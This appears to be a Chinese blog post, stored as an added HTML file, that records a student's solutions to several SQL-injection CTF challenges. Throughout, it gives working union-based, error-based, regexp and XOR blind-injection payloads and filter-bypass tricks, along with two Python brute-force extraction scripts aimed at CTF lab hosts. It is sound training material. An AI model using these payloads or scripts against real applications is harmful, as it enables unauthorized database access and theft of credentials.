@@ -1,0 +1,452 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>SQL注入刷题记录 | NaCl1</title>
+<link rel="shortcut icon" href="https://NaCl1.github.io/favicon.ico?v=1704386016631">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://NaCl1.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="SQL注入刷题记录 | NaCl1 - Atom Feed" href="https://NaCl1.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="SQL注入刷题记录
+[LitCTF 2023]这是什么？SQL ！注一下 ！
+
+可以看见已经给出了后端的闭合方式和查询的字段数,只需要按照语句构造闭合,进而尝试联合注入
+爆库名:
+http://node5.anna.nssctf.cn:28..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://NaCl1.github.io">
+  <img class="avatar" src="https://NaCl1.github.io/images/avatar.png?v=1704386016631" alt="">
+  </a>
+  <h1 class="site-title">
+    NaCl1
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              SQL注入刷题记录
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-10-05
+              </span>
+              <span>
+                13 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="sql注入刷题记录">SQL注入刷题记录</h1>
+<h2 id="litctf-2023这是什么sql-注一下">[LitCTF 2023]这是什么？SQL ！注一下 ！</h2>
+<figure data-type="image" tabindex="1"><img src="https://NaCl1.github.io/post-images/1696508307234.png" alt="" loading="lazy"></figure>
+<p>可以看见已经给出了后端的闭合方式和查询的字段数,只需要按照语句构造闭合,进而尝试联合注入</p>
+<p>爆库名:</p>
+<pre><code class="language-sql">http://node5.anna.nssctf.cn:28078/?id=-1)))))) union select database(),version();--+
+</code></pre>
+<p>回显:<code>Array (    [0] =&gt; Array        (            [username] =&gt; ctf            [password] =&gt; 10.4.13-MariaDB        ) )            </code></p>
+<p>爆表名:</p>
+<pre><code class="language-sql">http://node5.anna.nssctf.cn:28078/?id=-1)))))) union select 1,group_concat(table_name) from information_schema.tables where table_schema='ctf';--+
+</code></pre>
+<p>回显:<code>Array (    [0] =&gt; Array        (            [username] =&gt; 1            [password] =&gt; users        ) )            </code></p>
+<p>爆列名:</p>
+<pre><code>http://node5.anna.nssctf.cn:28078/?id=-1)))))) union select 1,group_concat(column_name) from information_schema.columns where table_name='users';--+
+</code></pre>
+<p>回显:<code>Array (    [0] =&gt; Array        (            [username] =&gt; 1            [password] =&gt; id,username,password,ip,time,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password        ) )            </code></p>
+<p>查询数据:</p>
+<pre><code class="language-sql">http://node5.anna.nssctf.cn:28078/?id=-1)))))) union select 1,group_concat(id,username,password) from users;--+
+</code></pre>
+<p>回显:<code>Array (    [0] =&gt; Array        (            [username] =&gt; 1            [password] =&gt; 1tanjiOHHHHHHH,2fake_flagF1rst_to_Th3_eggggggggg!} (4/4)        ) )            </code></p>
+<p>这是假的,虚晃一枪</p>
+<p>查询其他库名:</p>
+<pre><code class="language-sql">http://node5.anna.nssctf.cn:28078/?id=-1)))))) union select 1,schema_name from information_schema.SCHEMATA;--+
+</code></pre>
+<p>回显:<code>Array (    [0] =&gt; Array        (            [username] =&gt; 1            [password] =&gt; information_schema        )     [1] =&gt; Array        (            [username] =&gt; 1            [password] =&gt; mysql        )     [2] =&gt; Array        (            [username] =&gt; 1            [password] =&gt; ctftraining        )     [3] =&gt; Array        (            [username] =&gt; 1            [password] =&gt; performance_schema        )     [4] =&gt; Array        (            [username] =&gt; 1            [password] =&gt; test        )     [5] =&gt; Array        (            [username] =&gt; 1            [password] =&gt; ctf        ) )            </code></p>
+<p>可以看见有一个ctftraining库,之后也正式是在这里面查询到了flag</p>
+<pre><code class="language-sql">http://node5.anna.nssctf.cn:28078/?id=-1)))))) union select 1,group_concat(table_name) from information_schema.tables where table_schema='ctftraining';--+
+</code></pre>
+<pre><code class="language-sql">http://node5.anna.nssctf.cn:28078/?id=-1)))))) union select 1,group_concat(column_name) from information_schema.columns where table_name='flag';--+
+</code></pre>
+<pre><code class="language-sql">http://node5.anna.nssctf.cn:28078/?id=-1)))))) union select 1,group_concat(flag) from ctftraining.flag;--+
+</code></pre>
+<p>最终得到flag<code>Array (    [0] =&gt; Array        (            [username] =&gt; 1            [password] =&gt; NSSCTF{39980cfb-bbe7-49dc-802d-42174e5c3c39}        ) )            </code></p>
+<h2 id="陇剑杯-2021sql注入问1">[陇剑杯 2021]SQL注入（问1）</h2>
+<p>此题不太一样,是通过日志分析注入手法</p>
+<figure data-type="image" tabindex="2"><img src="https://NaCl1.github.io/post-images/1696508365086.png" alt="" loading="lazy"></figure>
+<p>可以看见大量的if substr,一眼布尔盲注</p>
+<p><code>NSSCTF{布尔盲注}</code></p>
+<h2 id="swpuctf-2021-新生赛sql">[SWPUCTF 2021 新生赛]sql</h2>
+<p>可以看见提示参数为<code>wllm</code>,传入参数后回显了两个字段<br>
+还是需要order by测试一下字段数<br>
+不过这里似乎过滤了空格,使用<code>/**/</code>进行绕过<br>
+<code>?wllm=1'/**/order/**/by/**/3%23</code><br>
+注:<code>%23</code>是<code>#</code>的url编码,这里使用<code>#</code>会错误,故使用编码<br>
+<code>?wllm=1'/**/order/**/by/**/3%23</code>   //得到查询字段数为3<br>
+<code>?wllm=-1%27/**/union/**/select/**/1,database(),version()%23</code>   //查询数据库信息<br>
+<img src="https://NaCl1.github.io/post-images/1696562843130.png" alt="" loading="lazy"><br>
+在查询表时发现似乎过滤了等号<br>
+<img src="https://NaCl1.github.io/post-images/1696563093757.png" alt="" loading="lazy"><br>
+使用<code>like</code>来替换<code>=</code><br>
+<code>?wllm=-1%27/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/'test_db'%23</code><br>
+//查到了<code>LTLT_flag,users</code>两张表<br>
+<code>?wllm=-1%27/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/'LTLT_flag'%23</code><br>
+//继续查询到<code>id,flag</code>两个字段</p>
+<p>查询flag:<br>
+<code>?wllm=-1%27/**/union/**/select/**/1,group_concat(id,flag),3/**/from/**/test_db.LTLT_flag%23</code><br>
+<img src="https://NaCl1.github.io/post-images/1696563658572.png" alt="" loading="lazy"><br>
+这里只有半截flag,一开始以为剩下的flag在别的地方,但是没找到,最后还是看了wp<br>
+先贴出原文地址:https://www.cnblogs.com/bkofyZ/p/17674252.html<br>
+原文中首先尝试了<code>substring</code>这个函数,发现被过滤,之后又使用了<code>mid</code>函数</p>
+<pre><code>/?wllm=-1'/**/union/**/select/**/1,2,mid(group_concat(flag),1,20)/**/from/**/test_db.LTLT_flag%23
+</code></pre>
+<pre><code>?wllm=-1'/**/union/**/select/**/1,2,mid(group_concat(flag),21,41)/**/from/**/test_db.LTLT_flag%23
+</code></pre>
+<pre><code>?wllm=-1'/**/union/**/select/**/1,2,mid(group_concat(flag),41,61)/**/from/**/test_db.LTLT_flag%23
+</code></pre>
+<p>之后拼接得到flag<br>
+NSSCTF{76467703-4e19-47a5-bde1-7ae0bed3fcfa}</p>
+<p><strong>关于substring函数和mid函数</strong>:</p>
+<ol>
+<li>substring:<br>
+①语法：substring(string ，index)|substring(string from index)</li>
+</ol>
+<p>即substring(被截取的字符串 , 开始位置序号)|substring(被截取的字符串 from开始位置序号)</p>
+<pre><code>参数说明
+
+string：必需，被截取的字符串，表示需要从该字符串截取目标字符。
+
+index：必需，开始截取的位置，为整数。当index为0时返回的是空值；当index为正数表示从左到右数的位置序数；当index为负数表示从右到左的位置序数。
+</code></pre>
+<p>②用法实例：<br>
+从指定字符串的某序数开始获取字符</p>
+<p>例：从“hello world”中截取“world”字符串。</p>
+<p>当序数为正数时，则开始字符“w”位置为7，注意的是“hello”和“world”之间的空字符是算一个字符。</p>
+<pre><code>#index为正数
+select substring('hello world',7)  
+或
+select substring('hello world'from 7)
+</code></pre>
+<p>当序数为负数时，则开始字符“w”位置为-5。</p>
+<pre><code>#index为负数
+select substring('hello world',-5)  
+或
+select substring('hello world' from -5)
+</code></pre>
+<ol start="2">
+<li>mid:<br>
+MID() 函数用于从文本字段中提取字符。<br>
+SQL MID() 语法<br>
+SELECT MID(column_name[,start,length]) FROM table_name;</li>
+</ol>
+<p>参数 描述:<br>
+column_name 	必需。要提取字符的字段。<br>
+start 	必需。规定开始位置（起始值是 1）。<br>
+length 	可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。</p>
+<h2 id="极客大挑战-2019babysql">[极客大挑战 2019]BabySQL</h2>
+<p>考察了一个联合注入双写绕过</p>
+<h2 id="极客大挑战-2019lovesql">[极客大挑战 2019]LoveSQL</h2>
+<p>仍然是查询了三个字段,可以先测一下显示位</p>
+<pre><code>?username=qwer'%20union%20select%201,2,3%23&amp;password=qwer
+</code></pre>
+<p>很明显可以在返回包中看见显示位为<code>hello 2</code>和your passsword <code>'3'</code><br>
+之后就是常规的联合注入<br>
+库名:<code>geek</code></p>
+<pre><code>?username=qwer'%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema='geek'%23&amp;password=qwer
+</code></pre>
+<p>表名:<code>geekuser,l0ve1ysq1</code></p>
+<pre><code>?username=qwer'%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name='l0ve1ysq1'%23&amp;password=qwer
+</code></pre>
+<p>这两张表下面都有<code>id,username,password</code>三个字段<br>
+查询后结果:<code>1,admin,6aa98b4e52c5c54132c0f1460bc5af61</code><br>
+这里是admin的明文密码,可以登录但没什么用<br>
+最终是在<code>l0ve1ysq1</code>这张表中查到了falg<br>
+查询后原文(包含了flag):</p>
+<pre><code>Hello 1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag{72fa4483-7b2f-476d-a43c-89961bedc520}！
+</code></pre>
+<h2 id="极客大挑战-2019hardsql">[极客大挑战 2019]HardSQL</h2>
+<p>仍然是字符型,但是union被过滤了,还有<code>* 空格</code>等都被过滤了<br>
+这里学到了可以使用<code>%0c 或 %09 </code>来代替空格,但是依旧被过滤<br>
+这里甚至过滤了<code>&gt; &lt;  =</code>,盲注也就很难实现了<br>
+考虑报错注入<br>
+使用<code>()</code>包裹sql语句从而避免使用空格</p>
+<pre><code>?username=admin&amp;password=qwer'or(updatexml(1,concat(0x7e,(database()),0x7e),1))%23
+</code></pre>
+<p>回显报错:<code>XPATH syntax error: '~geek~'</code><br>
+报错信息成功被替换为<code>geek</code>这个数据库名</p>
+<pre><code>?username=admin&amp;password=qwer'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23
+</code></pre>
+<p>回显:<code>XPATH syntax error: '~H4rDsq1~'</code><br>
+报错信息成功被替换为<code>H4rDsq1</code>这个数据表名</p>
+<pre><code>?username=admin&amp;password=qwer'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))%23
+</code></pre>
+<p>成功返回<code>id,username,password</code>三个字段</p>
+<pre><code>?username=admin&amp;password=qwer'or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(geek.H4rDsq1)),0x7e),1))%23
+</code></pre>
+<p>只能看见半截flag,尝试了<code>mid 和 substring</code>截断函数,但斗被过滤了<br>
+浅查了一下,这种现象是因为报错信息最大字符数为32<br>
+可以用<code>righ 和 left</code>来分别从两侧查看flag</p>
+<pre><code>?username=admin'or(updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)where(username)like('flag'))),1))%23&amp;password=qwer
+</code></pre>
+<pre><code>?username=admin'or(updatexml(1,concat(0x7e,(select(left(password,30))from(H4rDsq1)where(username)like('flag'))),1))%23&amp;password=qwer
+</code></pre>
+<p>right:  2-4833-45d2-bf3c-1fc36cef4a3d}<br>
+left:   flag{fa3c3e92-4833-45d2-bf3c-1<br>
+拼接一下得到flag:<code>flag{fa3c3e92-4833-45d2-bf3c-1fc36cef4a3d}</code></p>
+<h2 id="nctf-2019sqli">[NCTF 2019]SQLi</h2>
+<p>简单测试了一下,发现过滤了很多字符,并且admin似乎也被过滤了<br>
+在robots.txt中可以看见网站下还存在一个hint.txt:</p>
+<pre><code>$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\'|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;
+
+
+If $_POST['passwd'] === admin's password,
+
+Then you will get the flag;
+</code></pre>
+<p>可以看见还是过滤了挺多字符,不太会,还是求助wp了<br>
+https://blog.csdn.net/shinygod/article/details/124100832<br>
+这里又出现了一种新的注入方式:<strong>正则注入</strong><br>
+题中并未过滤<code>\</code>,<br>
+因此我们可以对<code>username</code>传入一个<code>\</code>将后单引号转义,从而闭合username的值<br>
+构造完整payload:</p>
+<pre><code>username=\&amp;passwd=||/**/passwd/**/regexp/**/&quot;^a&quot;;%00
+</code></pre>
+<p><strong>注</strong>:对username传入<code>\</code> 后,username的 本应该起包裹作用的 后单引号 被转义为普通字符,username的值就是<code>' and passwd=</code>且被单引号包裹<br>
+(为什么需要是<code>' and passwd=</code>呢,这里大概是给服务器了一个我们似乎是传入了两个参数的假象,实际上在拼接sql语句后,这里只有username及其值-----猜测)<br>
+payload:</p>
+<pre><code>username=\&amp;passwd=||/**/passwd/**/regexp/**/&quot;^a&quot;;%00
+</code></pre>
+<p>拼接后的sql语句:</p>
+<pre><code>select * from users where username='\' and passwd='||/**/passwd/**/regexp/**/&quot;^a&quot;;
+</code></pre>
+<p>此方法类似于盲注,匹配密码以某个字符或某字符串开头,但需要一个匹配成功后返回包中特定的字符串,<br>
+我们可以使用burp来fuzz一下全部字母大小写和数字,发现以字母y开头时,返回包中有location: welcome.php 那么这个<code>welcome</code>就是我们用来判断是否匹配成功的依据.</p>
+<p>现在就可以来尝试爆破passwd<br>
+python脚本如下:</p>
+<pre><code class="language-python">import requests
+from urllib import parse
+import time
+import string
+
+passwd = ''
+strings = &quot;_&quot; + string.ascii_lowercase + string.ascii_uppercase + string.digits
+url = 'http://f8b86e21-db1f-499b-a514-a7e6e145cef6.node4.buuoj.cn:81/'
+n = 1
+while n &lt; 100:
+    for char in strings:
+        data = {
+            'username': '\\',
+            'passwd': '||/**/passwd/**/regexp/**/\&quot;^'+passwd+char+'\&quot;;'+parse.unquote('%00')
+        }
+        res = requests.post(url,data).content.decode('utf-8')
+        time.sleep(0.01)
+        
+        if 'welcome' in res:
+            print('{}th has done'.format(n))
+            passwd = passwd + char
+            n = n + 1
+            break
+        if char == '9' and 'welcome' not in res:
+            print(passwd)
+            print('done!!!!')
+            n = 100
+            break
+</code></pre>
+<p>运行得到结果<br>
+<img src="https://NaCl1.github.io/post-images/1696584055177.png" alt="" loading="lazy"><br>
+重新提交表单,username填<code>\</code>passwd填<code>you_will_never_know7788990</code><br>
+得到flag<br>
+<img src="https://NaCl1.github.io/post-images/1696584183369.png" alt="" loading="lazy"></p>
+<h2 id="极客大挑战-2019easysql">[极客大挑战 2019]EasySQL</h2>
+<p>简单测出来是字符型注入,order by了一下发现查询了三个字段,刚准备尝试联合注入,就直接给flag了,不明白<br>
+<img src="https://NaCl1.github.io/post-images/1696676579858.png" alt="" loading="lazy"></p>
+<h2 id="极客大挑战-2019finalsql">[极客大挑战 2019]FinalSQL</h2>
+<p>注入点并没有常规地出现在username和password中,而是在点击数字的id中<br>
+这里又出现了一种新的盲注方式(异或注入)<br>
+https://blog.csdn.net/SoporAeternus12/article/details/124001820</p>
+<p>我的exp:</p>
+<pre><code class="language-python">import requests
+import time
+flag = ''
+host = &quot;http://a4a96d3a-2737-4e02-997d-dd535ed8e216.node4.buuoj.cn:81/&quot;
+#sql = &quot;(database())&quot;  #查库
+#sql = &quot;(select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek'))&quot;    #查表
+#sql = &quot;(select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y'))&quot; #查列
+sql = &quot;(select(group_concat(id,username,password))from(geek.F1naI1y))&quot;#
+for i in range(1,1000):
+    min = 32
+    max = 128
+    mid = (min + max)//2
+    while(min &lt; max):
+        payload = host + &quot;search.php?id=1^(ascii(substr(&quot;+ sql +&quot;,{},1))&lt;{})--+&quot;.format(i,mid)
+        res = requests.get(url=payload)
+        time.sleep(0.05)  #适当的延时,不然会意外退出导致查询到的信息只有一段
+        if 'ERROR' in res.text:
+            max = mid
+        else:
+            min = mid + 1
+        mid = (min + max)//2
+    if mid &lt;= 32 or mid &gt;= 127:
+        break
+    flag = flag+chr(mid-1)
+    print(flag)
+</code></pre>
+<p><strong>需要解释的是</strong>:<br>
+当返回包中含有<code>ERROR</code>,这是由1^1=0而导致的,故当回包中含有<code>ERROR</code>时,即为我们构造的payload为真.<br>
+当然,也可以将<code>NOT,NOT</code>字样作为判断条件,只不过此时需要修改二分查找的部分操作</p>
+<p>最终运行结果:</p>
+<pre><code>1mygodcl4y_is_really_amazing,2welcomewelcome_to_my_blog,3sitehttp://www.cl4y.top,4sitehttp://www.cl4y.top,5sitehttp://www.cl4y.top,6sitehttp://www.cl4y.top,7Sycwelcom_to_Syclover,8finallycl4y_really_need_a_grilfriend,9flagflag{02e21116-87b5-4329-9254-a52cde8b8a0e}
+</code></pre>
+<p>包含了flag<br>
+这里flag藏得很深,运行需要花费较长时间</p>
+<p><strong>做题过程中总结出的经验</strong>:</p>
+<ol>
+<li>在构造较长payload时,一定要注意括号的闭合是否有误,是否有未闭合的括号使得程序出错</li>
+<li>程序爆出了一半的数据就停止运行,可以适当__增加延时__</li>
+<li>flag不一定总会出现在理应出现的位置</li>
+<li>太长的数据一定要先爆出来看看,__不能半途而废__😭😭</li>
+</ol>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#sql%E6%B3%A8%E5%85%A5%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95">SQL注入刷题记录</a>
+<ul>
+<li><a href="#litctf-2023%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88sql-%E6%B3%A8%E4%B8%80%E4%B8%8B">[LitCTF 2023]这是什么？SQL ！注一下 ！</a></li>
+<li><a href="#%E9%99%87%E5%89%91%E6%9D%AF-2021sql%E6%B3%A8%E5%85%A5%E9%97%AE1">[陇剑杯 2021]SQL注入（问1）</a></li>
+<li><a href="#swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bsql">[SWPUCTF 2021 新生赛]sql</a></li>
+<li><a href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019babysql">[极客大挑战 2019]BabySQL</a></li>
+<li><a href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019lovesql">[极客大挑战 2019]LoveSQL</a></li>
+<li><a href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019hardsql">[极客大挑战 2019]HardSQL</a></li>
+<li><a href="#nctf-2019sqli">[NCTF 2019]SQLi</a></li>
+<li><a href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019easysql">[极客大挑战 2019]EasySQL</a></li>
+<li><a href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019finalsql">[极客大挑战 2019]FinalSQL</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://NaCl1.github.io/post/wen-jian-shang-chuan-lou-dong/">
+              <h3 class="post-title">
+                文件上传漏洞
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://NaCl1.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
